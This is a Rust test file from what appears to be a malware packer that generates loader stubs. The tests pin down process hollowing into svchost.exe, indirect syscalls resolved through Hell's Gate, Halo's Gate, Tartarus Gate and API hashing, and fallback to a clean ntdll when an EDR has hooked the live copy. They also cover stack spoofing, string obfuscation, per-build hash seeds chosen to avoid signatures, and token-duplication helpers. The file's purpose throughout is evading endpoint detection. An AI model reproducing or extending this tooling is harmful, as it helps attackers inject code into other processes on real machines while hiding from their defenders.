use super::*;
use crate::engine::obfuscation::{StringStrategy, StringsConfig};
use crate::techniques::process_hollowing::Params;
use crate::techniques::TechniqueKind;

/// The standard FNV basis, used as the test seed so the API-hashing hash
/// constants match the pinned reference values.
const TEST_SEED: u64 = 0xcbf2_9ce4_8422_2325;

fn xor_config() -> StringsConfig {
    StringsConfig {
        strategy: StringStrategy::Xor,
        key: Some([0x5Au8; 32]),
    }
}

fn hollowing_pipeline() -> Vec<RuntimeStep> {
    vec![RuntimeStep::new(TechniqueKind::ProcessHollowing {
        params: Params {
            payload: None,
            target: r"C:\Windows\System32\svchost.exe".to_string(),
        },
    })]
}

fn sleep_pipeline() -> Vec<RuntimeStep> {
    vec![RuntimeStep::new(TechniqueKind::SleepObfuscation {
        params: crate::techniques::sleep_obfuscation::Params::default(),
    })]
}

fn indirect() -> SyscallsConfig {
    SyscallsConfig {
        mode: SyscallsMode::Indirect,
        resolver: Resolver::HellsGate,
        ..Default::default()
    }
}

fn tartarus() -> SyscallsConfig {
    SyscallsConfig {
        mode: SyscallsMode::Indirect,
        resolver: Resolver::TartarusGate,
        ..Default::default()
    }
}

fn api_hash_config() -> SyscallsConfig {
    SyscallsConfig {
        mode: SyscallsMode::Indirect,
        resolver: Resolver::ApiHash,
        ..Default::default()
    }
}

fn halos() -> SyscallsConfig {
    SyscallsConfig {
        mode: SyscallsMode::Indirect,
        resolver: Resolver::HalosGate,
        ..Default::default()
    }
}

// --- configuration ---

#[test]
fn from_yaml_defaults_to_none_when_absent() {
    let plan = SyscallsConfig::from_yaml(None).expect("defaults should be valid");
    assert_eq!(plan.mode, SyscallsMode::None);
    assert_eq!(plan.resolver, Resolver::HellsGate);
}

#[test]
fn from_yaml_parses_indirect_mode() {
    let yaml = YamlSyscallsPlan {
        mode: "indirect".into(),
        resolver: "hells_gate".into(),
        stack_spoofing: None,
    };
    let plan = SyscallsConfig::from_yaml(Some(&yaml)).expect("indirect should be valid");
    assert_eq!(plan.mode, SyscallsMode::Indirect);
    assert_eq!(plan.resolver, Resolver::HellsGate);
}

#[test]
fn from_yaml_rejects_unknown_mode() {
    let yaml = YamlSyscallsPlan {
        mode: "direct".into(),
        resolver: "hells_gate".into(),
        stack_spoofing: None,
    };
    let err = SyscallsConfig::from_yaml(Some(&yaml)).expect_err("direct should fail");
    assert!(
        err.to_string().contains("build.stub.syscalls.mode"),
        "unclear error: {err}"
    );
}

#[test]
fn from_yaml_parses_tartarus_gate() {
    let yaml = YamlSyscallsPlan {
        mode: "indirect".into(),
        resolver: "tartarus_gate".into(),
        stack_spoofing: None,
    };
    let plan = SyscallsConfig::from_yaml(Some(&yaml)).expect("tartarus_gate should be valid");
    assert_eq!(plan.mode, SyscallsMode::Indirect);
    assert_eq!(plan.resolver, Resolver::TartarusGate);
}

#[test]
fn from_yaml_parses_api_hash() {
    let yaml = YamlSyscallsPlan {
        mode: "indirect".into(),
        resolver: "api_hash".into(),
        stack_spoofing: None,
    };
    let plan = SyscallsConfig::from_yaml(Some(&yaml)).expect("api_hash should be valid");
    assert_eq!(plan.mode, SyscallsMode::Indirect);
    assert_eq!(plan.resolver, Resolver::ApiHash);
}

#[test]
fn from_yaml_parses_halos_gate() {
    let yaml = YamlSyscallsPlan {
        mode: "indirect".into(),
        resolver: "halos_gate".into(),
        stack_spoofing: None,
    };
    let plan = SyscallsConfig::from_yaml(Some(&yaml)).expect("halos_gate should be valid");
    assert_eq!(plan.mode, SyscallsMode::Indirect);
    assert_eq!(plan.resolver, Resolver::HalosGate);
}

#[test]
fn from_yaml_rejects_unknown_resolver() {
    let yaml = YamlSyscallsPlan {
        mode: "indirect".into(),
        resolver: "freshy_calls".into(),
        stack_spoofing: None,
    };
    let err = SyscallsConfig::from_yaml(Some(&yaml)).expect_err("freshy_calls should fail");
    assert!(
        err.to_string().contains("build.stub.syscalls.resolver"),
        "unclear error: {err}"
    );
}

#[test]
fn parses_the_stack_spoofing_block_with_defaults() {
    let yaml: YamlSyscallsPlan =
        serde_yml::from_str("mode: indirect\nstack_spoofing: {}\n").expect("valid YAML");
    let plan = SyscallsConfig::from_yaml(Some(&yaml)).expect("valid config");
    assert_eq!(plan.stack_spoofing, Some(stack_spoofing::Params::default()));
}

#[test]
fn parses_explicit_decoy_bytes() {
    let yaml: YamlSyscallsPlan =
        serde_yml::from_str("mode: indirect\nstack_spoofing:\n  decoy_bytes: 8192\n")
            .expect("valid YAML");
    let plan = SyscallsConfig::from_yaml(Some(&yaml)).expect("valid config");
    assert_eq!(
        plan.stack_spoofing,
        Some(stack_spoofing::Params { decoy_bytes: 8192 })
    );
}

#[test]
fn stack_spoofing_requires_indirect() {
    let yaml: YamlSyscallsPlan =
        serde_yml::from_str("mode: none\nstack_spoofing: {}\n").expect("valid YAML");
    let err = SyscallsConfig::from_yaml(Some(&yaml)).expect_err("none must fail");
    assert!(
        err.to_string().contains("stack_spoofing"),
        "unclear error: {err}"
    );
}

#[test]
fn the_spoofing_block_comes_from_the_config() {
    let mut config = indirect();
    config.stack_spoofing = Some(stack_spoofing::Params::default());
    let block = render_block_with(
        &config,
        &hollowing_pipeline(),
        &xor_config(),
        &[],
        TEST_SEED,
    );
    assert!(block.contains(".global nt_invoke"), "{block}");
    assert!(block.contains("jmp nt_invoke_raw"), "{block}");
    assert!(block.contains("init_stack_spoofing"), "{block}");
    assert!(!block.contains('$'), "leftover placeholders: {block}");

    let plain = render_block_with(
        &indirect(),
        &hollowing_pipeline(),
        &xor_config(),
        &[],
        TEST_SEED,
    );
    assert!(plain.contains("fn nt_invoke("), "{plain}");
    assert!(!plain.contains("init_stack_spoofing"), "{plain}");
}

#[test]
fn yaml_block_defaults_to_none_and_hells_gate() {
    let yaml: YamlSyscallsPlan = serde_yml::from_str("mode: indirect\n").expect("parse");
    assert_eq!(yaml.mode, "indirect");
    assert_eq!(yaml.resolver, "hells_gate");
}

// --- required functions ---

#[test]
fn required_lists_hollowing_functions_in_canonical_order() {
    let required = required(&hollowing_pipeline());
    assert_eq!(
        required,
        vec![
            "NtAllocateVirtualMemory",
            "NtWriteVirtualMemory",
            "NtReadVirtualMemory",
            "NtResumeThread",
            "NtUnmapViewOfSection",
            "NtProtectVirtualMemory",
            "NtSuspendThread",
            "NtQueryInformationProcess",
            "NtGetContextThread",
            "NtSetContextThread",
            "NtCreateThreadEx",
            "NtWaitForSingleObject",
            "NtQueryInformationThread",
            "NtClose",
        ]
    );
}

#[test]
fn required_is_empty_when_no_technique_uses_syscalls() {
    assert!(required(&sleep_pipeline()).is_empty());
    assert!(required(&[]).is_empty());
}

#[test]
fn required_deduplicates_across_the_pipeline() {
    // Two hollowing steps would be invalid plan, but the union logic
    // must still deduplicate (defensive).
    let pipeline = hollowing_pipeline();
    let names: BTreeSet<&str> = required(&pipeline).into_iter().collect();
    assert_eq!(names.len(), 14, "no duplicates expected");
}

// --- Hell's Gate parsing (unit-tested reference for the stub) ---

#[test]
fn resolve_ssn_extracts_the_expected_ssn_from_a_canonical_prologue() {
    // `mov r10, rcx; mov eax, 0x2A`
    let prologue = [0x4C, 0x8B, 0xD1, 0xB8, 0x2A, 0x00, 0x00, 0x00];
    assert_eq!(parse_ssn_prologue(&prologue), Some(42));
}

#[test]
fn resolve_ssn_reports_pattern_mismatch_for_a_hooked_prologue() {
    // A hooked stub (e.g. `jmp` to an EDR trampoline) has no SSN.
    let hooked = [0x48, 0xB8, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00];
    assert_eq!(parse_ssn_prologue(&hooked), None);
}

#[test]
fn resolve_ssn_reports_function_not_found_when_the_buffer_is_unreadable() {
    // Mirrors the stub: a failed lookup (GetProcAddress/read) is
    // FunctionNotFound, before any pattern check happens.
    let lookup = |_name: &str| None;
    let read = |_addr: usize| None;
    let err = resolve_ssn_reference(&lookup, &read, "NtResumeThread")
        .expect_err("a missing function must fail");
    assert_eq!(
        err,
        ReferenceError::FunctionNotFound("NtResumeThread".into())
    );
}

#[test]
fn resolve_ssn_reads_the_ssn_through_the_injected_lookup() {
    let lookup = |_name: &str| Some(0x1000);
    let read = |_addr: usize| Some([0x4C, 0x8B, 0xD1, 0xB8, 0x07, 0x00, 0x00, 0x00]);
    let ssn = resolve_ssn_reference(&lookup, &read, "NtWriteVirtualMemory")
        .expect("a canonical prologue should resolve");
    assert_eq!(ssn, 7);
}

/// Host-side mirror of the stub's `resolve_ssn_with_fallback` decision:
/// only a hooked live prologue falls back to the clean on-disk copy.
fn resolve_ssn_with_fallback_reference(
    live: &dyn Fn(&str) -> std::result::Result<u32, ReferenceError>,
    file: &dyn Fn(&str) -> std::result::Result<u32, ReferenceError>,
    name: &str,
) -> std::result::Result<u32, ReferenceError> {
    match live(name) {
        Ok(ssn) => Ok(ssn),
        Err(ReferenceError::PatternMismatch(_)) => file(name),
        Err(other) => Err(other),
    }
}

#[test]
fn hells_gate_falls_back_to_the_file_on_a_hooked_prologue() {
    let hooked = |_name: &str| Err(ReferenceError::PatternMismatch("NtX".into()));
    let clean = |_name: &str| Ok(9);
    assert_eq!(
        resolve_ssn_with_fallback_reference(&hooked, &clean, "NtX"),
        Ok(9)
    );

    // A missing live export is not a hook, so it does not fall back.
    let missing = |_name: &str| Err(ReferenceError::FunctionNotFound("NtX".into()));
    assert!(matches!(
        resolve_ssn_with_fallback_reference(&missing, &clean, "NtX"),
        Err(ReferenceError::FunctionNotFound(_))
    ));

    // A live success is never overridden by the file.
    let live = |_name: &str| Ok(11);
    assert_eq!(
        resolve_ssn_with_fallback_reference(&live, &clean, "NtX"),
        Ok(11)
    );
}

/// Reference error type for [`resolve_ssn_reference`], mirroring the
/// stub's `SyscallError::FunctionNotFound` / `PatternMismatch` variants.
#[derive(Debug, PartialEq, Eq)]
enum ReferenceError {
    FunctionNotFound(String),
    PatternMismatch(String),
}

/// Host-side mirror of the stub's `resolve_ssn`, with the address lookup
/// and the memory read injected so the resolution logic is testable
/// without Windows. Keep in sync with the generated stub's resolver.
fn resolve_ssn_reference(
    lookup: &dyn Fn(&str) -> Option<usize>,
    read: &dyn Fn(usize) -> Option<[u8; 8]>,
    name: &str,
) -> std::result::Result<u32, ReferenceError> {
    let address = lookup(name).ok_or_else(|| ReferenceError::FunctionNotFound(name.to_string()))?;
    let prologue =
        read(address).ok_or_else(|| ReferenceError::FunctionNotFound(name.to_string()))?;
    parse_ssn_prologue(&prologue).ok_or_else(|| ReferenceError::PatternMismatch(name.to_string()))
}

// --- API hashing (unit-tested reference for the stub) ---

#[test]
fn api_hash_matches_fnv1a_reference_values() {
    // FNV-1a 64-bit with the canonical basis; the empty string returns the
    // basis untouched, and the first required NT function is pinned against
    // an independent reference computed outside the crate.
    let h =
        |name: &[u8]| resolvers::api_hash::api_hash_with(name, resolvers::api_hash::OFFSET_BASIS);
    assert_eq!(h(b""), 0xcbf2_9ce4_8422_2325);
    assert_eq!(h(b"NtAllocateVirtualMemory"), 0x4fe2_32be_2dca_3638);
    assert_eq!(h(b"NtGetContextThread"), 0x60b6_1d0a_f197_a950);
}

#[test]
fn api_hash_is_deterministic() {
    let h =
        |name: &[u8]| resolvers::api_hash::api_hash_with(name, resolvers::api_hash::OFFSET_BASIS);
    assert_eq!(h(b"NtWriteVirtualMemory"), h(b"NtWriteVirtualMemory"));
    assert_ne!(h(b"NtWriteVirtualMemory"), h(b"NtReadVirtualMemory"));
}

#[test]
fn api_hash_constants_are_build_seeded() {
    // The packer emits a per-build FNV basis (`API_HASH_SEED`), so the same
    // function hashes to a different constant in a different build — a
    // fixed basis would be a static signature.
    let one = render_block_with(
        &api_hash_config(),
        &hollowing_pipeline(),
        &xor_config(),
        &[],
        TEST_SEED,
    );
    let two = render_block_with(
        &api_hash_config(),
        &hollowing_pipeline(),
        &xor_config(),
        &[],
        TEST_SEED ^ 0xdead_beef,
    );
    let consts = |block: &str| -> Vec<String> {
        block
            .lines()
            .filter(|line| line.contains("resolve_ssn(&file, 0x"))
            .map(|line| line.trim().to_string())
            .collect()
    };
    assert!(
        one.contains("const API_HASH_SEED"),
        "the seed const is missing"
    );
    assert!(!consts(&one).is_empty(), "no hash constants emitted");
    assert_ne!(
        consts(&one),
        consts(&two),
        "the constants must vary by build"
    );
}

// --- gadget search (unit-tested reference for the stub) ---

#[test]
fn find_gadget_locates_the_syscall_ret_sequence() {
    let bytes = [0x90, 0x90, 0x0F, 0x05, 0xC3, 0xCC, 0xCC];
    assert_eq!(find_gadget_offset(&bytes), Some(2));
}

#[test]
fn find_gadget_returns_none_when_the_sequence_is_absent() {
    let bytes = [0x0F, 0x05, 0xC2, 0x0F, 0x05, 0x90, 0xC3];
    assert_eq!(find_gadget_offset(&bytes), None);
}

#[test]
fn find_gadget_returns_none_for_short_buffers() {
    assert_eq!(find_gadget_offset(&[]), None);
    assert_eq!(find_gadget_offset(&[0x0F, 0x05]), None);
}

#[test]
fn find_gadget_accepts_a_retf_terminator() {
    // Some builds end the stub with `syscall; retf` (CB) instead of `ret`.
    let bytes = [0x90, 0x0F, 0x05, 0xCB, 0xCC];
    assert_eq!(find_gadget_offset(&bytes), Some(1));
}

#[test]
fn syscall_diagnostics_are_keyword_free() {
    // The always-compiled `SyscallError` messages live in the prelude and
    // reach the binary; none may name a resolver or a hook. (The `tech_dbg!`
    // strings are inert unless `build.stub.debug` is set.)
    let prelude = crate::engine::syscalls::prelude::INDIRECT_PRELUDE;
    for keyword in ["hells_gate", "tartarus_gate", "api_hash", "hooked"] {
        assert!(
            !prelude.contains(keyword),
            "diagnostic prelude names '{keyword}'"
        );
    }
}

// --- rendered block (tests 6 and 7 of the phase spec) ---

#[test]
fn indirect_block_obfuscates_the_nt_names() {
    let block = render_block_with(
        &indirect(),
        &hollowing_pipeline(),
        &xor_config(),
        &[],
        TEST_SEED,
    );

    // The names must be reconstructed at runtime, never cleartext outside
    // comments (doc comments never reach the binary; the guardrail strips
    // them the same way).
    let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
    assert!(
        leaked.is_empty(),
        "cleartext NT names leaked outside comments: {leaked:?}"
    );
    // ... while the obfuscated definitions and the resolver exist.
    assert!(
        block.contains("table.alloc_vm = resolve_ssn"),
        "missing resolution line"
    );
    assert!(block.contains("crate::dec_xor"), "xor strategy not applied");
    assert!(
        block.contains("resolve_ssn_with_fallback(module, &"),
        "no resolution lines"
    );
    assert!(!block.contains('$'), "leftover placeholders: {block}");
}

#[test]
fn indirect_block_contains_the_trampoline_and_ssn_table() {
    let block = render_block_with(
        &indirect(),
        &hollowing_pipeline(),
        &xor_config(),
        &[],
        TEST_SEED,
    );
    assert!(block.contains("global_asm"), "trampoline missing");
    assert!(block.contains("jmp r11"), "gadget jump missing");
    assert!(block.contains("struct SsnTable"), "SSN table missing");
    assert!(block.contains("fn find_gadget"), "gadget scanner missing");
    assert!(block.contains("pub fn nt_alloc_vm"), "helper missing");
    assert!(block.contains("fn init_syscalls"), "init missing");
}

#[test]
fn tartarus_gate_block_reads_ssns_from_a_clean_file_copy() {
    let block = render_block_with(
        &tartarus(),
        &hollowing_pipeline(),
        &xor_config(),
        &[],
        TEST_SEED,
    );

    // The resolver walks a clean copy of ntdll read from disk, not the
    // live module's export stubs.
    assert!(block.contains("std::fs::read"), "clean-copy read missing");
    assert!(block.contains("fn export_rva"), "export walker missing");
    assert!(
        block.contains("resolve_ssn(&file, &"),
        "file-based resolution missing"
    );
    assert!(
        !block.contains("resolve_ssn(module, &"),
        "Hell's Gate resolution must not be emitted for Tartarus Gate"
    );
    // The shared machinery is still present.
    assert!(block.contains("global_asm"), "trampoline missing");
    assert!(block.contains("struct SsnTable"), "SSN table missing");
    assert!(block.contains("fn find_gadget"), "gadget scanner missing");
    assert!(!block.contains('$'), "leftover placeholders: {block}");
}

#[test]
fn tartarus_gate_block_obfuscates_the_ntdll_path_and_names() {
    let block = render_block_with(
        &tartarus(),
        &hollowing_pipeline(),
        &xor_config(),
        &[],
        TEST_SEED,
    );
    let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
    assert!(
        leaked.is_empty(),
        "cleartext names/paths leaked outside comments: {leaked:?}"
    );
}

#[test]
fn api_hash_block_resolves_by_hash_not_name() {
    let block = render_block_with(
        &api_hash_config(),
        &hollowing_pipeline(),
        &xor_config(),
        &[],
        TEST_SEED,
    );

    // The resolver matches exports by a precomputed hash, so no NT name
    // string is emitted at all (not even obfuscated).
    let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
    assert!(
        leaked.is_empty(),
        "cleartext NT names leaked outside comments: {leaked:?}"
    );
    assert!(block.contains("fn api_hash"), "hash function missing");
    assert!(block.contains("std::fs::read"), "clean-copy read missing");
    assert!(
        block.contains("fn export_rva_by_hash"),
        "hash export walker missing"
    );
    assert!(
        block.contains("resolve_ssn(&file, 0x4fe232be2dca3638)?;"),
        "the NtAllocateVirtualMemory hash constant is missing"
    );
    assert!(
        !block.contains("resolve_ssn(module, &"),
        "Hell's Gate resolution must not be emitted for api_hash"
    );
    assert!(
        !block.contains("resolve_ssn(&file, &"),
        "name-based file resolution must not be emitted for api_hash"
    );
    assert!(block.contains("global_asm"), "trampoline missing");
    assert!(block.contains("struct SsnTable"), "SSN table missing");
    assert!(block.contains("fn find_gadget"), "gadget scanner missing");
    assert!(!block.contains('$'), "leftover placeholders: {block}");
}

#[test]
fn halos_gate_block_derives_hooked_ssns_from_neighbours() {
    let block = render_block_with(
        &halos(),
        &hollowing_pipeline(),
        &xor_config(),
        &[],
        TEST_SEED,
    );

    assert!(block.contains("fn neighbour_ssn"), "neighbour walk missing");
    assert!(
        block.contains("fn live_export_address"),
        "the resolver must not depend on GetProcAddress"
    );
    assert!(
        block.contains("resolve_ssn_with_fallback(module, &"),
        "the per-function call is missing"
    );
    assert!(
        !block.contains("GetProcAddress(module,"),
        "Halo's Gate resolves the live export through the export table"
    );
    let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
    assert!(
        leaked.is_empty(),
        "cleartext names/paths leaked outside comments: {leaked:?}"
    );
    assert!(!block.contains('$'), "leftover placeholders: {block}");
}

#[test]
fn none_block_has_no_ssn_resolution() {
    let block = render_block_with(
        &SyscallsConfig::default(),
        &hollowing_pipeline(),
        &xor_config(),
        &[],
        TEST_SEED,
    );

    assert!(
        !block.contains("resolve_ssn"),
        "no SSN resolution in none mode"
    );
    assert!(!block.contains("global_asm"), "no trampoline in none mode");
    assert!(!block.contains("nt_invoke"), "no syscall in none mode");
    assert!(!block.contains("SsnTable"), "no SSN table in none mode");
    assert!(block.contains("VirtualAllocEx"), "direct call missing");
    assert!(block.contains("WriteProcessMemory"), "direct call missing");
    assert!(block.contains("ReadProcessMemory"), "direct call missing");
    assert!(block.contains("ResumeThread"), "direct call missing");
    assert!(block.contains("pub fn nt_alloc_vm"), "helper missing");
    assert!(!block.contains('$'), "leftover placeholders: {block}");
}

#[test]
fn none_block_obfuscates_the_dynamic_unmap_names() {
    let block = render_block_with(
        &SyscallsConfig::default(),
        &hollowing_pipeline(),
        &xor_config(),
        &[],
        TEST_SEED,
    );
    let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
    assert!(
        !leaked
            .iter()
            .any(|l| l == "NtUnmapViewOfSection" || l == "ntdll.dll"),
        "dynamic-resolution names leaked outside comments: {leaked:?}"
    );
}

#[test]
fn empty_pipeline_renders_a_no_op_block() {
    let block = render_block_with(
        &indirect(),
        &sleep_pipeline(),
        &xor_config(),
        &[],
        TEST_SEED,
    );
    assert!(block.contains("fn init_syscalls"), "no-op init missing");
    assert!(
        !block.contains("global_asm"),
        "no machinery without requirements"
    );
    assert!(
        !block.contains("nt_alloc_vm"),
        "no helpers without requirements"
    );

    let none_block = render_block_with(
        &SyscallsConfig::default(),
        &[],
        &xor_config(),
        &[],
        TEST_SEED,
    );
    assert!(none_block.contains("fn init_syscalls"));
    assert!(!none_block.contains("VirtualAllocEx"));
}

#[test]
fn stack_strategy_obfuscates_names_without_dec_xor() {
    let stack = StringsConfig {
        strategy: StringStrategy::Stack,
        key: None,
    };
    let block = render_block_with(&indirect(), &hollowing_pipeline(), &stack, &[], TEST_SEED);
    assert!(!block.contains("dec_xor"), "stack must not use dec_xor");
    let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
    assert!(
        leaked.is_empty(),
        "cleartext names leaked outside comments: {leaked:?}"
    );
    assert!(
        block.contains("std::hint::black_box"),
        "stack stores missing"
    );
}

/// The direct-proxy metadata: a faithful helper is offered, and the two
/// convenience helpers are backed by native-signature variants.
#[test]
fn direct_proxy_metadata_covers_every_function() {
    let info = nt_proxy_info("NtReadVirtualMemory").expect("NtReadVirtualMemory is direct");
    assert_eq!(info.helper_name, "nt_read_vm");
    assert_eq!(info.forward, "process, base, buffer, size, read");
    // The in-out deviation of NtProtectVirtualMemory is handled by the
    // forwarding expression.
    let protect = nt_proxy_info("NtProtectVirtualMemory").expect("NtProtectVirtualMemory");
    assert!(protect.forward.contains("*base"));

    // The two convenience helpers are backed by native-signature variants.
    let create = nt_proxy_info("NtCreateThreadEx").expect("NtCreateThreadEx");
    assert_eq!(create.helper_name, "nt_create_thread_ex_native");
    assert_eq!(create.params.len(), 11);
    let wait = nt_proxy_info("NtWaitForSingleObject").expect("NtWaitForSingleObject");
    assert_eq!(wait.helper_name, "nt_wait_for_single_object_native");

    // Every function is proxeable now.
    assert_eq!(nt_proxy_names().len(), NT_FUNCTIONS.len());
}

/// A native-signature proxy helper is rendered (and re-exported) in indirect
/// mode, next to the convenience helper the techniques still use.
#[test]
fn a_native_proxy_helper_is_rendered_and_reexported() {
    let block = render_block_with(
        &indirect(),
        &[],
        &xor_config(),
        &["NtCreateThreadEx"],
        TEST_SEED,
    );
    assert!(
        block.contains("pub fn nt_create_thread_ex_native"),
        "{block}"
    );
    assert!(
        block.contains("pub fn nt_create_thread_ex("),
        "the convenience helper must stay"
    );
    // Re-exported so the generated proxy can call it through `crate::`.
    assert!(
        block.contains("nt_create_thread_ex_native,")
            || block.contains("nt_create_thread_ex_native}"),
        "native helper not re-exported: {block}"
    );
}

#[test]
fn token_helpers_offer_direct_proxies() {
    let open = nt_proxy_info("NtOpenProcessToken").expect("direct");
    assert_eq!(open.helper_name, "nt_open_process_token");
    assert_eq!(open.params.len(), 3);
    assert_eq!(open.forward, "process, access, token");

    let duplicate = nt_proxy_info("NtDuplicateToken").expect("direct");
    assert_eq!(duplicate.helper_name, "nt_duplicate_token");
    assert_eq!(duplicate.params.len(), 6);
    assert_eq!(
        duplicate.forward,
        "existing, access, attributes, effective_only, token_type, new_token"
    );
}

#[test]
fn token_helpers_render_in_indirect_mode() {
    let block = render_block_with(
        &indirect(),
        &[],
        &xor_config(),
        &["NtOpenProcessToken", "NtDuplicateToken"],
        TEST_SEED,
    );
    assert!(block.contains("pub fn nt_open_process_token"), "{block}");
    assert!(
            block.contains(
                "pub fn nt_open_process_token(\n        process: HANDLE,\n        access: u32,\n        token: *mut core::ffi::c_void,\n    ) -> i32 {"
            ),
            "NtOpenProcessToken must take three arguments: {block}"
        );
    assert!(block.contains("pub fn nt_duplicate_token"), "{block}");
    assert!(block.contains("effective_only: u8"), "{block}");
    assert!(block.contains("ssns.open_process_token"), "{block}");
    assert!(block.contains("ssns.duplicate_token"), "{block}");
    assert!(!block.contains('$'), "leftover placeholder: {block}");
}

#[test]
fn token_helpers_render_in_none_mode_without_leaking_names() {
    let block = render_block_with(
        &SyscallsConfig::default(),
        &[],
        &xor_config(),
        &["NtOpenProcessToken", "NtDuplicateToken"],
        TEST_SEED,
    );
    assert!(block.contains("resolve_nt_export(&"), "{block}");
    assert!(
            block.contains(
                "type OpenProcessTokenFn = unsafe extern \"system\" fn(\n        HANDLE,\n        u32,\n        *mut core::ffi::c_void,\n    ) -> i32;"
            ),
            "the x86 stdcall typedef must take three arguments: {block}"
        );
    assert!(block.contains("effective_only: u8"), "{block}");
    assert!(!block.contains('$'), "leftover placeholder: {block}");
    let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
    assert!(leaked.is_empty(), "cleartext names leaked: {leaked:?}");
}
